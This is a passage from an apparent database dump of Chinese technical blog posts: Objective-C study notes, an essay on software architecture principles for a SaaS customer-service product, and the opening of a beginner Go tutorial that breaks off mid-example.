<p>1.&nbsp;&nbsp;&nbsp;&nbsp;将类的实现分散到多个文件或框架中；</p>\r\n\r\n			<p>2.&nbsp;&nbsp;&nbsp;&nbsp;创建对私有方法的前向引用；</p>\r\n\r\n			<p>【Cocoa中没有真正的私有方法，则实现私有方法类似功能的方法为：</p>\r\n\r\n			<p>先在类别中声明方法；然后到现有类的实现中实现该方法。</p>\r\n\r\n			<p>这样这个类中的其他方法可以使用该方法，而其他外部的类就不会知道该方法的存在了。】</p>\r\n\r\n			<p>3.&nbsp;&nbsp;&nbsp;&nbsp;向对象添加非正式协议。</p>\r\n\r\n			<p>【创建一个NSObject的类别称为创建一个非正式协议。】</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>委托delegate是一种对象，另一个类的对象会要求委托对象执行它的某些操作。</p>\r\n\r\n			<p><strong>受委托对象在某个时间（某个事件触发）时，会自动通知委托对象执行委托方法。</strong><strong>&nbsp;</strong></p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p><strong>选择器：</strong><strong>@selector</strong><strong>（）</strong>:选择器只是一个方法名称，但它以objective-c运行时使用的特殊方式编码，以快速执行查询。圆括号中的内容是方法名。</p>\r\n\r\n			<p>所以Car类的setEngine:方法的选择器是：@selector（setEngine:</p>\r\n\r\n			<p>受委托对象如何知道其委托对象是否能处理它（受委托对象）发送给它（委托对象）的消息？</p>\r\n\r\n			<p>通过选择器，受委托对象先检查委托对象，询问其是否能响应该选择器。如果能，则向它发送消息。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>8.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; width:90%; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>协议：</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>正式协议是一个命名的方法列表。</p>\r\n\r\n			<p>采用协议意味着必须实现该协议的所有方法。否则，编译器会发出警告。</p>\r\n\r\n			<p><strong>正式协议就像</strong><strong>JAVA</strong><strong>中的接口一样。</strong><strong>&nbsp;</strong></p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>声明协议：</p>\r\n\r\n			<p>@protocal&nbsp;NSCopying</p>\r\n\r\n			<p>-(id) copywithzone:(NSZone *) zone; //方法列表</p>\r\n\r\n			<p>@end</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>采用协议：</p>\r\n\r\n			<p>@interface Car:NSObject&nbsp;&lt;NSCopying,NSCoding&gt;&nbsp;//中括号中是要实现的协议列表</p>\r\n\r\n			<p>{//实例变量列表}</p>\r\n\r\n			<p>//方法列表</p>\r\n\r\n			<p>@end</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>在objective-c 2.0中，有新特性：@optional, @required</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>9.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; width:90%; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>AppKit:</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>创建APPKIT项目：</p>\r\n\r\n			<p>File&mdash;new project&mdash;mac os&mdash;application&mdash;Cocoa application;</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>IBOutlet与IBAction</p>\r\n\r\n			<p>这两个都是APPKIT提供的#defines.</p>\r\n\r\n			<p>IBOutlet没有任何作用，不会对它进行编译。</p>\r\n\r\n			<p>IBAction定义为void。</p>\r\n\r\n			<p>这两个是为Interface Builder以及阅读代码的人提供的标记。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>.xib文件一般称为.nib文件。</p>\r\n\r\n			<p>.nib文件是包含被冻结对象的二进制文件。</p>\r\n\r\n			<p>而.xib文件是XML格式的nib文件。</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'objective-c基础教程——学习小结',104,NULL,0),(68,0,'20150823091744',2,'<p>&ldquo;风语者客服+&rdquo;是针对中小型企业推出的客服SaaS，节约了企业自建客服系统所需的巨大成本。为了给企业提供稳定可靠且优质的服务，我们在整体架构上费尽心思。虽然不尽完美，希望借此抛砖引玉，互相切磋。&nbsp;<br />\r\n<br />\r\n<strong>前言</strong>&nbsp;<br />\r\n<br />\r\n&rdquo;Look deep into nature, and then you will understand everything better.&ldquo; -- Albert Einstein&nbsp;<br />\r\n<br />\r\n我国传统文化上，要做成一件事，讲究三个方面：明道，优术，取势。在软件架构设计方面而言，也是类似的道理：遵循自然规律以明确大的方向，使用优秀的实操战术，再根据实际情况落地。&nbsp;<br />\r\n<br />\r\n这是个快餐年代，几乎所有人都只做一件事 -&ldquo;取势&rdquo;。 几乎没有多少人会去理解一个Servlet的工作原理，去理解一次HTTP请求的完整流程，因为有超多框架帮你屏蔽了这里的细节。询问一个人会什么技术，回答也往往是我会Hibernate、Spring、Ibatis、会PullToRefresh组件、会使用SDWebimage。不过这些框架（Framework）其实并不是软件架构。软件架构是一所有生命力的房子，而这些框架只是大一点的板砖。&nbsp;<br />\r\n<br />\r\n因为笔者水平有限，这里只提一些普遍准则，也就是&rdquo;正确的废话&ldquo;，以飨视听。不会深入到实操战术上，比如怎么用Spring实施MVC架构，怎么使用Maven管理依赖，Redis的常用操作，怎么搭建一个负载均衡的集群，如何使用阿里巴巴的Dubbo框架进行服务化等等。如果大家有兴趣，可以自行搜索，有很多优秀的文章可供参考。&nbsp;<br />\r\n<br />\r\n不幸的&ldquo;程序猿&rdquo;和&ldquo;程序媛&rdquo;各有各的痛苦，幸福的程序员都是相似的。其实说幸福有点言过其实，下面就说说怎么让他们不那么痛苦。&nbsp;<br />\r\n<br />\r\n<strong>一. 很好的模块化支持</strong>&nbsp;<br />\r\n<br />\r\n&ldquo;At the bottom of every person&#39;s dependency, there is always pain, Discovering the pain and healing it is an essential step in ending dependency.&rdquo; --Chris Prentiss&nbsp;<br />\r\n<br />\r\n他们都在一个相对稳定的软件架构里编码，自己的代码不会依赖很多模块，不会因为自己微小的改动造成全局的失败。正如&quot;1984&quot;中的老大哥说的，Ignorance is strength（&rdquo;对外界的&ldquo;无知就是一种力量）.&nbsp; 任何一个模块都不能有太强的存在感。&nbsp;<br />\r\n<br />\r\n曾经在一个大型互联网公司里面，任何人只要用到一个核心模块的功能，就必须依赖一个部署在某远程服务器的库，而且还有IP限制，只能把代码部署到指定网段才能运行起来。导致基本上没法在本地进行单元测试或者简单调试。这个核心库的存在感太强，就成了开发的瓶颈，严重的降低了生产力和码农的幸福程度。&nbsp;<br />\r\n<br />\r\n在&ldquo;风语者客服+&rdquo;的架构中，每个码农都可以很方便的在本地把服务启动起来，一分钟up and running，随便做一些改动就可以立竿见影的看到效果。这里要归功于几个东西：&nbsp;<br />\r\n<br />\r\n<strong>1.Git代码管理</strong>&nbsp;<br />\r\n<br />\r\n在团队作战中，每个程序员可以取下来完整的最新代码库，也可以在本地分支上尽情挥毫泼墨，而不担心影响别人的工作。也可以把本地修改先stash起来，review一下别人的代码，再unstash恢复回来。要想提高团队效率，代码仓库管理建议尽快迁移到Git上。&nbsp;<br />\r\n<br />\r\n<strong>2.Maven、Gradle、Cocopods等依赖管理</strong>&nbsp;<br />\r\n<br />\r\nMaven是一个管理依赖（Dependency）的工具，现在在Java社区应该是比较普及的，无法想象现在还有团队直接拷贝jar包来管理依赖。虽然早期没有Maven的时候，都是拷贝jar包这么过来的，碰到的问题也是显而易见的，依赖的jar包作者改了某个bug，没能及时传导到调用方。多个调用方使用不一致的jar包，导致各种奇异bug。对应的在安卓社区，使用gradle的比较多，iOS的Objective-C开发中，多采用CocoaPods。&nbsp;<br />\r\n<br />\r\n<strong>二. 高内聚，低耦合</strong>&nbsp;<br />\r\n<br />\r\nHe should focus on his knitting, not trying to do everything. Do one thing well.-- Steve Jobs&nbsp;<br />\r\n<br />\r\n&quot;Do one thing well&quot;其实不算是老乔的专利，UNIX哲学和Google哲学都提倡这一点。这句话本身不完全对，比如对于一个商人，如果只会Do one thing well，那他无法在市场中存活，但是在工程师中却是万般推崇的哲学。&nbsp;<br />\r\n<br />\r\n我们可以期望一个人具备一百种技能，然而对一个工具只期望它把一个需求解决好解决彻底，对于实现工具的一个类，一个方法，更是如此。但是，实际经验中，我们经常看到一个5000行以上代码的类，活像一个巨人版的瑞士军刀，什么都能做，但是什么都做不好。这就是&rdquo;Separation of Duty&quot;没有做好的典范。&nbsp;<br />\r\n<br />\r\n在风语者&rdquo;客服+&ldquo;对外提供的SDK和API中，我们也提倡同样的思想，力争把App使用&rdquo;客服+&ldquo;SDK的门槛降到最低，每个API都能自言其一，而且API直接没有时序上的依赖关系。内部各个模块的开发，也秉承同样的责任分割原则。责任分割原则的落实，没有什么好的框架或者工具来支持。只能通过老鸟经常去做Code Review，找出存在的问题，提出重构方案，并督促菜鸟改进。&nbsp;<br />\r\n<br />\r\n个人一般采用的重构思路，仅作为参考，照搬后被老板批评乃至造成工伤概不负责：&nbsp;<br />\r\n1.把一个大的工具类，根据主题不同，拆分成若干个互不干扰的高内聚工具类；举个例子，一个万能的NetworkUtils可能可以拆成HttpUtils， FTPUtils，TelnetUtils等；&nbsp;<br />\r\n2.对于一个被频繁调用的类，仔细观察调用情况，如果有一些方法的被调用频率远远低于其他方法，那么需要考虑这个方法是不是应该放在这个类中；&nbsp;<br />\r\n3.存在A,B两个类之间的相互依赖，或者更多类的混乱依赖，那么就更要抽丝剥茧，通过合理安排类的功能来去除环形依赖；&nbsp;<br />\r\n4.尝试一句话说清楚一个类的功能，不要使用&ldquo;和&rdquo;，&ldquo;以及&rdquo;，&ldquo;或者&rdquo;等连接词；如果出现了这些连接词，就需要引起重视；&nbsp;<br />\r\n<br />\r\n<strong>三. 用进化拥抱变化</strong>&nbsp;<br />\r\n<br />\r\n&ldquo;It is not the strongest or the most intelligent who will survive but those who can best manage change.&rdquo; ―<a href=\"http://www.goodreads.com/author/show/230707.Leon_C_Megginson\" style=\"color: rgb(0, 102, 153);\" target=\"_blank\">Leon C. Megginson</a>&nbsp;<br />\r\n<br />\r\n前段时间，朋友圈疯传一篇文章 -&mdash;&mdash;&ldquo;架构腐化之谜&rdquo;，大家都深表同感，纷纷表示对自己架构的未来的担忧。然而，说句不合时宜的话， 90%的担忧是杞人忧天，因为以现在产品更新换代的速度，90%的项目面市即意味着死亡，没等到架构腐朽，产品已经入土了。&nbsp;<br />\r\n<br />\r\n剩下10%里面，也许有9%会一直坚持活下去，但是不会蓬勃发展，也就是说，只要保证不出现内存泄露之类的问题，代码就会一直在几台小服务器上运行下去，哪怕后面没有人维护也没关系。只有1%的产品，会日新月异的更新迭代，最终成长为巨无霸，或者巨无霸的生态下的一个环节。这个言论看似悲观，却是对现实最好的妥协。&nbsp;<br />\r\n<br />\r\n谬用一下泰戈尔的名言：&ldquo;不是槌的打击，而是水的载歌载舞，使鹅卵石臻于完美&rdquo;， 不是闭门造车的架构，而是不断拥抱变化的需求，才使得架构臻于完美。&nbsp;<br />\r\n<br />\r\n假如在早期就纠结于架构的完美性，而延迟产品的交付，是非常得不偿失的。只有生存下来，才有机会。再根据市场变化，不断优化架构，从而延长软件的生命周期。那么，假如撞大运，真的成了这1%，怎样做才能算是拥抱变化？&nbsp;<br />\r\n<br />\r\n首先，请参考本文第一点和第二点。如果这两点基本功没有练好，那么谈架构的进化就和还没有通关十八罗汉的新手就想练成九阴真经是一个道理。&nbsp;<br />\r\n<br />\r\n<strong>在设计之初，初步考虑系统的Scalability（可伸缩性）</strong>&nbsp;<br />\r\n<br />\r\n下面在第四点会详细阐述。&nbsp;<br />\r\n<br />\r\n<strong>内部的各个模块尽量做到可插拔</strong>&nbsp;<br />\r\n<br />\r\n一方面是接口和实现的分离，可以随着需求的变化更换实现；另一方面，尽量把功能服务化，成为微服务，并且可以监控到服务的互相调用情况，当某个服务老化，可以逐步废弃或使用新的服务取代之。这一点上，阿里巴巴的Dubbo框架是一个不错的选择。&nbsp;<br />\r\n<br />\r\n<strong>尽量采用优秀的框架，站在巨人的肩膀上</strong>&nbsp;<br />\r\n<br />\r\n例如在Web层面，我们使用Twitter的Bootstrap前端框架来实现响应式Web编程，提高生产效率的同时减少了为解决各种设备适配问题的投入。当然，这就需要设计师配合，按照Bootstrap规范来设计页面，减少一些个性化设计。&nbsp;<br />\r\n<br />\r\n<strong>最后，考虑系统的Resilience（弹性，也叫耐受性）</strong>&nbsp;<br />\r\n<br />\r\n俗一点说，就是变成一只打不死的小强，代码中尽量提前预判可能遇到的各种情形。经常看到代码里面有一堆的if(){}判断语句，我就问作者，&ldquo;你考虑过else{}吗？&rdquo;一般回答都是，&ldquo;这绝对只有if，不会有else的&rdquo;，可如果真的遇到else怎么办？千年虫问题就是这么诞生的。可能很多新同学还不知道什么是千年虫问题，简单地说，就是当年的码农，为了省一点内存空间，只用了2位数来表达年份，比如int year = 98; 表达1998年。我猜码农当时的心态也是，&ldquo;就我这代码，还能活到2000年，搞笑吧？&rdquo;&nbsp;<br />\r\n<br />\r\n程序员们平时可以多扩大自己的脑洞，想想有哪些else情况自己没有处理，而且可以轻易处理的。比如服务器挂了，那么App端是不是也要跟着crash，还是给出友好一点的提示，或者更友好一点，使用本地缓存。&nbsp;<br />\r\n<br />\r\n<strong>四. 设计可扩展，但不要过度设计</strong>&nbsp;<br />\r\n<br />\r\nit&#39;s better to have infinite scalability and not need it, than to need infinite scalability and not have it--@littleidea 网友&nbsp;<br />\r\n<br />\r\n无限的扩展能力是一种奢望，但是起码不能让扩展能力成为0。试想一下，你辛辛苦苦为老板开发了一个网站，过了一个月，网站超负荷了，老板说，&ldquo;小A啊，之前2台服务器花了我5万块，预计流量马上要翻倍了，再给你5万块，帮我扛过去啊。&rdquo;结果你发现，问题不是线性增加服务器就能解决的，原来的程序没有做分层（Web，Business Logic， Data Access等)，导致加服务器也只能把所有层的代码全搬到新的服务器，虽然只是Business Logic的计算有压力，却要浪费老板很多服务器。更糟糕的是，因为程序里面用到了文件系统和操作系统命令，不好做负载均衡。&nbsp;<br />\r\n<br />\r\n这里有一些准则供参考：&nbsp;<br />\r\n1.代码分层是必须的，层次明朗以后，当哪个层次的负载较重，想办法对该层次进行优化或者扩容即可；&nbsp;<br />\r\n2.保持核心服务是无状态的，所谓无状态就是没有和请求相关的数据依赖；&nbsp;<br />\r\n3.尽可能的选用已被验证的广泛采用的成熟基础架构；&nbsp;<br />\r\n4.充分利用Zookeeper等集群管理工具，来对服务进行管理；&nbsp;<br />\r\n风语者&ldquo;客服+&rdquo;中，把业务相关的代码内部组装为风语者ServiceBox，使用阿里巴巴的Dubbo服务进行注册管理。当负载增加时，可以迅速在运维层面增加服务节点，以提供更高的服务能力，从而保证客户的优质体验。&nbsp;</p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/1037/9650718f-90a8-37bb-b391-8b8f064c35ee.jpg\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n作者简介：&nbsp;<br />\r\n<br />\r\n<strong>黄耀华</strong>&nbsp;<br />\r\n<br />\r\n具有11年的计算机软件研发及大型互联网产品研发经验，曾在IBM，百度，人人网等业内顶级企业任职，特别对企业级软件，大规模数据处理，搜索引擎，移动App开发 等领域的原理和实现有着全面且深入的认识。</p>\r\n\r\n<ul>\r\n	<li><a href=\"http://www.iteye.com/news/30873#\" style=\"color: rgb(0, 102, 153); text-decoration: none;\">查看图片附件</a></li>\r\n</ul>\r\n\r\n<p>来自:&nbsp;<a href=\"http://www.csdn.net/article/2015-08-18/2825486\" style=\"color: rgb(0, 102, 153); text-decoration: none;\">CSDN</a></p>\r\n',0,0,'如何设计一款优秀的软件架构',24,NULL,0),(69,0,'20150823093301',2,'<p><strong>安装 Golang</strong></p>\r\n\r\n<p>在 <a href=\"http://golang.org/dl/\">http://golang.org/dl/</a> 可以下载到 Golang。安装文档：<a href=\"http://golang.org/doc/install\">http://golang.org/doc/install</a>。</p>\r\n\r\n<p><strong>Hello Go</strong></p>\r\n\r\n<p>我们先创建一个文件 hello.go：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\npackage main<br />\r\n&nbsp;<br />\r\nimport &quot;fmt&quot;<br />\r\n&nbsp;<br />\r\nfunc main() {<br />\r\n&nbsp;&nbsp;&nbsp; fmt.Printf(&quot;hello Golang\\n&quot;);<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>执行此程序：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\ngo run hello.go</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>包</strong></p>\r\n\r\n<p>Golang 程序由包（packages）组成，程序从 main 包开始运行：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\npackage main</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>此语句表示此文件属于 main 包（多个源文件可以属于同一个包）。import 语句后接上包所在的路径（被叫做包路径或导入路径），一个目录中放置一个包，通常的做法是，目录名和包名相同：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nimport (<br />\r\n&nbsp;&nbsp;&nbsp; &quot;fmt&quot;<br />\r\n&nbsp;&nbsp;&nbsp; &quot;math/rand&quot;<br />\r\n)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>这里的 &ldquo;fmt&rdquo; 和 &ldquo;math/rand&rdquo; 为包路径（导入路径）。上面的 import 语句也可以这样写：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nimport &quot;fmt&quot;<br />\r\nimport &quot;math/rand&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>我们导入了包之后，就可以通过 &ldquo;包名.name&rdquo; 来引用导出的 name 了，例如：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nimport &quot;fmt&quot;<br />\r\n&nbsp;<br />\r\n// fmt 包导出了 Printf<br />\r\nfmt.Printf(&quot;hello Golang\\n&quot;);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在 Golang 中，一个名字如果首字母大写则表示此名字被导出。</p>\r\n\r\n<p><strong>函数</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\npackage main\r\n \r\nimport \"fmt\"\r\n \r\nfunc add(x int, y int) int {\r\n    return x + y\r\n}\r\n \r\nfunc main() {\r\n    fmt.Println(add(42, 13))\r\n}</code></pre>\r\n\r\n<p><br />\r\n需要注意的就是，变量名在类型之前，这和很多语言都不一样。另外 x int, y int 也可以写为 x, y int：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\nfunc add(x, y int) int {\r\n    return x + y\r\n}</code></pre>\r\n\r\n<p><br />\r\n函数可以返回多个值：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">package main\r\n \r\nimport \"fmt\"\r\n \r\nfunc swap(x, y string) (string, string) {\r\n    return y, x\r\n}\r\n \r\nfunc main() {\r\n    a, b := swap(\"hello\", \"world\")\r\n    fmt.Println(a, b)\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>返回值可以被指定变量名，并且像变量一样使用：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">package main\r\n \r\nimport \"fmt\"\r\n \r\nfunc split(sum int) (x, y int) {\r\n    x = sum * 4 / 9\r\n    y = sum - x\r\n    return\r\n}\r\n \r\nfunc main() {\r\n    fmt.Println(split(17))\r\n}\r\n</code></pre>\r\n\r\n<p>可以看到 split 函数直接使用 return 语句而不用带参数。</p>\r\n\r\n<p><strong>变量</strong></p>\r\n\r\n<p>变量的声明使用 var 语句：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nvar i int<br />\r\nvar c, python, java bool</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>变量在声明时可以进行初始化：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nvar x, y int = 1, 2<br />\r\nvar i, j = true, &quot;hello&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>我们看到，初始化时可以指定也可以不指定变量类型。<br />\r\n按照 Golang 的语法，在函数外的任何结构（construct）都通过一个关键字开始，例如变量使用 var 关键字开始，函数使用 func 关键字开始。在函数内，变量赋值可以使用 := 操作符：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\npackage main<br />\r\n&nbsp;<br />\r\nfunc main() {<br />\r\n&nbsp;&nbsp;&nbsp; var x, y int = 1, 2<br />\r\n&nbsp;&nbsp;&nbsp; i, j := true, &quot;hello&quot;<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>:= 操作符左边为变量，右边为值。</p>\r\n\r\n<p><strong>数据类型</strong></p>\r\n\r\n<p>基本数据类型：</p>\r\n\r\n<p>1.bool<br />\r\n2.string<br />\r\n3.int int8 int16 int32 int64<br />\r\n4.uint uint8 uint16 uint32 uint64<br />\r\n5.uintptr<br />\r\n6.byte（等价于 uint8）<br />\r\n7.rune（等价于 int32，用于表示一个 unicode code point）<br />\r\n8.float32 float64<br />\r\n9.complex64 complex128</p>\r\n\r\n<p>类型转换使用表达式 T(v)，含义为将 v 转换为类型 T：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var i int = 42\r\nvar f float64 = float64(i)\r\n \r\ni := 42\r\nf := float64(i)</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>类型转换总需要显式的进行。</p>\r\n\r\n<p>使用 const 来声明常量：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">const Pi = 3.14\r\n \r\nconst (\r\n    Big = 1 &lt;&lt; 100\r\n    Small = Big &gt;&gt; 99\r\n)\r\n</code></pre>\r\n\r\n<p><strong>控制语句</strong></p>\r\n\r\n<p><strong>for 语句</strong></p>\r\n\r\n<p>Golang 使用（且只使用）for 来进行循环（没有 while 语句）：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">package main\r\n \r\nfunc main() {\r\n    sum := 0\r\n   \r\n    for i := 0; i &lt; 10; i++ {\r\n        sum += i\r\n    }\r\n   \r\n    // 这种写法等价于 C/C++ 等语言中的 while 语句\r\n    for sum &lt; 1000 {\r\n        sum += sum\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p>区别于 C/C++ 等语言，使用 for 语句时不需要 () 并且 {} 是必须的（后面谈到的 if、switch 在此语法处理上也是一样的）。如果需要无限循环，那么使用：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nfor {<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>if 语句</strong></p>\r\n\r\n<p>if 语句可以在执行条件判断前带一个语句（这常被叫做 if 带上一个短语句），此语句中变量的生命周期在 if 语句结束后结束。例如：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\npackage main\r\n \r\nimport (\r\n    \"fmt\"\r\n    \"math/rand\"\r\n)\r\n \r\nfunc main() {\r\n    if n := rand.Intn(6); n &lt;= 2 {\r\n        fmt.Println(\"[0, 2]\", n)\r\n    } else {\r\n        fmt.Println(\"[3, 5]\", n)\r\n    }\r\n \r\n    // 这里开始无法使用变量 n\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>switch</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\npackage main\r\n \r\nimport (\r\n    \"fmt\"\r\n    \"runtime\"\r\n)\r\n \r\nfunc main() {\r\n    fmt.Print(\"Go runs on \")\r\n    // switch 类似 if 可以带上一个短语句\r\n    switch os := runtime.GOOS; os {\r\n    case \"darwin\":\r\n        fmt.Println(\"OS X.\")\r\n    case \"linux\":\r\n        fmt.Println(\"Linux.\")\r\n    default:\r\n        // freebsd, openbsd,\r\n        // plan9, windows...\r\n        fmt.Printf(\"%s.\", os)\r\n    }\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>不像 C/C++ 等语言，Golang 中无需使用 break 语句来跳出 switch。另外，switch 可以没有条件：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\npackage main\r\n \r\nimport (\r\n    \"fmt\"\r\n    \"time\"\r\n)\r\n \r\nfunc main() {\r\n    t := time.Now()\r\n    switch {\r\n    case t.Hour() &lt; 12:\r\n        fmt.Println(\"Good morning!\")\r\n    case t.Hour() &lt; 17:\r\n        fmt.Println(\"Good afternoon.\")\r\n    default:\r\n        fmt.Println(\"Good evening.\")\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p><strong>defer</strong></p>\r\n\r\n<p>一个 defer 语句能够将一个函数调用加入一个列表中（这个函数调用被叫做 deferred 函数调用），在当前函数调用结束时调用列表中的函数。范例：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">func CopyFile(dstName, srcName string) (written int64, err error) {\r\n    src, err := os.Open(srcName)\r\n    if err != nil {\r\n        return\r\n    }\r\n    defer src.Close()\r\n \r\n    dst, err := os.Create(dstName)\r\n    if err != nil {\r\n        return\r\n    }\r\n    defer dst.Close()\r\n \r\n    return io.Copy(dst, src)\r\n}\r\n</code></pre>\r\n\r\n<p>deferred 函数调用按先进后出的顺序执行：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">package main\r\n \r\nimport \"fmt\"\r\n \r\nfunc main() {\r\n    for i := 0; i &lt; 5; i++ {\r\n        // 输出 43210\r\n        defer fmt.Print(i)\r\n    }\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>结构（structs）</strong></p>\r\n\r\n<p>结构是一个域的集合：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\npackage main\r\n \r\nimport \"fmt\"\r\n \r\ntype Vertex struct {\r\n    X int\r\n    Y int\r\n}\r\n \r\nfunc main() {\r\n    v := Vertex{1, 2}\r\n    v.X = 4\r\n    fmt.Println(v)\r\n}\r\n</code></pre>\r\n\r\n<p>Golang 中是存在指针的，但是指针不支持算术运算：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">p := Vertex{1, 2} // {1, 2} 为 struct literal\r\nq := &amp;p // q 类型为 *Vertex\r\nq.X = 2 // 直接访问域 X</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>就像上面看到的，struct 的 literal 由 {} 包裹，在 struct literal 中我们可以使用 Name: 这样的语法来为特定域设置值：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\ntype Vertex struct {\r\n    X, Y int\r\n}\r\n \r\nr := Vertex{X: 3} // 这时候 Y 为 0</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>new 函数</strong></p>\r\n\r\n<p>我们可以通过表达式 new(T) 分配一个被初始化为 0 且类型为 T 的值，并且返回指向此值的指针，用法如下：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var p *T = new(T)\r\np := new(T)\r\n</code></pre>\r\n\r\n<p>更详尽的例子：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">package main\r\n \r\nimport \"fmt\"\r\n \r\ntype Vertex 